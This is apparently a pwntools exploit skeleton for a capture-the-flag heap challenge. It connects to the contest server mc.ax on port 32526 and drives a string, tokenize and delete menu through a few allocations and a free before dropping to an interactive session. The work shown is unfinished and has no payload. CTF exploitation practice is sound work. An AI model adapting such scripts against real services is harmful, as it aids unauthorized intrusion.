#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("chall_patched")

context.binary = exe

host = "mc.ax"
port = 32526

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp main+0
bp do_str+0
bp do_tok+0
bp do_del+0
'''.format(**locals())

info = lambda msg: log.info(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

def challenge_do_str(size: bytes, input:bytes):
    sla(b"> ", b"1")
    sla(b"size? ", size)
    sa(b"str? ", input)

def challenge_do_tok(idx: bytes, delim: bytes):
    sla(b"> ", b"2")
    sla(b"idx? ", idx)
    sa(b"delim? ", delim)

def challenge_do_del(idx: bytes):
    sla(b"> ", b"3")
    sla(b"idx? ", idx)

io = start()

challenge_do_str(b"2000", b"aa bb cc dd ee")
challenge_do_str(b"2000", b"aa bb cc dd ee")
challenge_do_del(b"0")
challenge_do_str(b"30", b"")

io.interactive()

